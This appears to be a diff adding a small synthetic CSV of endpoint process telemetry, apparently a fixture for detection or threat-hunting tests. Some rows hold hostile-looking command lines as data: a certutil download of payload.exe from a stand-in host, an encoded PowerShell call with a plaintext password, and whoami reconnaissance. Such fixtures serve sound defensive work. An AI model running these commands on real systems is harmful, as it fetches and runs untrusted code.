@@ -1,0 +1,5 @@
+timestamp,hostname,username,process_name,command_line,sha256,remote_ip,remote_port
+2025-10-09T08:55:00Z,PC-ANNA,anna,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,,
+2025-10-09T08:56:40Z,PC-ANNA,anna,powershell.exe,powershell.exe -nop -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA= C:\Users\anna\x.ps1 password=Summer2026,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,185.199.108.153,443
+2025-10-09T08:58:20Z,SRV-FILE01,svc-backup,certutil.exe,certutil -urlcache -f http://evil-update.example/payload.exe C:\Temp\p.exe,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,93.184.216.34,80
+2025-10-09T09:00:00Z,PC-BOB,bob,chrome.exe,chrome.exe,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,142.250.74.5,443
